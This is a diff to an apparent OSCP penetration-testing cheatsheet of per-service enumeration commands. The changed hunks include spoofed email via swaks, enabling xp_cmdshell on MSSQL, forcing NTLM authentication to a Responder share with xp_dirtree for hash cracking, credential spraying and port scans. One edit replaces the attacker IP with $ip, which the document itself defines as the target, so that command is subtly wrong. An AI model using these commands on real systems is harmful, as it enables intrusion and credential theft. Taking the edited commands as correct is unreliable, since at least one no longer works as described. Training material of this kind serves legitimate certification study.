@@ -9,7 +9,7 @@ summary: "Per-service enumeration command reference. When you see an open port, 
 Per-service enumeration command reference. When you see an open port, start with the commands in that section.
 
 - Source: https://heretek.dev/oscp-cheatsheet/enumeration/ (Jean Romero) — Reconstructed
-- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
+- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP (`$ip` is used as a target-host alias in many commands)
 
 ## General Principles
 
@@ -430,7 +430,7 @@ If every address returns 550, the server may require authentication:
 
 ```bash
 # Use auth creds (found in git repos, config files, databases)
-sudo swaks -t target@domain.com --from sender@domain.com --server $ip --body @body.txt --header "Subject: Important" -ap -au username -ap password
+sudo swaks -t target@domain.com --from sender@domain.com --server $ip --body @body.txt --header "Subject: Important" -a -au username -ap password
 ```
 
 ## NFS (2049)
@@ -593,7 +593,8 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 If sysadmin = 1:
 
 ```sql
-enable_xp_cmdshell EXEC xp_cmdshell 'whoami';
+enable_xp_cmdshell
+EXEC xp_cmdshell 'whoami';
 ```
 
 If sysadmin = 0:
@@ -658,7 +659,7 @@ Connect to MSSQL
   ↓ spray creds against SMB/WinRM/RDP/MSSQL
 ```
 
-Even without sysadmin you cannot use xp_cmdshell, but you can pull creds from user tables. Spray those creds against other machines.
+Without sysadmin, xp_cmdshell is unavailable — but you can still pull credentials from user tables and spray them against other machines.
 
 ### Legacy enumeration (quick check)
 
@@ -684,9 +685,9 @@ EXEC xp_cmdshell 'whoami';
 sudo responder -I tun0
 
 # Terminal 2: from the MSSQL client, force authentication to your IP
-EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;
+EXEC xp_dirtree '\\$ip\share', 1, 1;
 # or:
-EXEC master..xp_subdirs '\\YOUR_IP\share';
+EXEC master..xp_subdirs '\\$ip\share';
 ```
 
 Responder captures the NTLMv2 hash of the MSSQL service account → crack with `hashcat -m 5600`
@@ -769,7 +770,7 @@ for port in 21 22 80 135 139 445 3389 5985; do (echo >/dev/tcp/10.10.10.5/$port)
 
 ```powershell
 # PowerShell (Windows)
-1..254 | % {Test-Connection "10.10.10.$_" -Count 1 -Quiet -TimeoutSeconds 1}
+1..254 | % {Test-Connection "10.10.10.$_" -Count 1 -Quiet}
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.5", $_)) "TCP port $_ is open"} 2>$null
 Test-NetConnection -Port 445 10.10.10.5
 ```
